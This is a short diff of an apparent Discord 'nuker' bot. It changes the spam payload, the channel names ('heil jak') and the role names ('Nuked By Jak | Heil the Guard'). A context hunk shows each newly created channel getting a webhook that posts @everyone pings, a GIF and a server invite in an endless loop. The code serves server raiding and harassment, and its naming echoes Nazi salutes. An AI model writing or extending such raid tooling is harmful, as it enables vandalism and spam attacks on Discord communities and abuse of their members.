@@ -10,9 +10,9 @@ prefix = '>'
 intents = discord.Intents.all()
 TOKEN = input("Token:")
 headers = {'Authorization': f'Bot {TOKEN}'}
-chNames = ['heil hmg', 'heil hmg', 'heil hmg', 'heil hmg']
+chNames = ['heil ja', 'heil jak', 'heil jak', 'heil jak']
 rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
-SPAM = "@everyone https://cdn.discordapp.com/attachments/1086450936295194625/1096192512554713138/lv_0_20230411200517.mp4  https://discord.gg/rdXHweYQ7f"
+SPAM = "@everyone https://media.discordapp.net/attachments/1109864692106661958/1111222979322458193/caption.gif https://discord.gg/hBVYT6HPeK"
 rq = rq_.Session()
 
 Sachs = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)
@@ -72,7 +72,7 @@ async def on_ready():
 
 @Sachs.event
 async def on_guild_channel_create(channel):
-    webhook = await channel.create_webhook(name="HEIL THE GUARD")
+    webhook = await channel.create_webhook(name="Jak")
     while True:
         await webhook.send(SPAM)
 
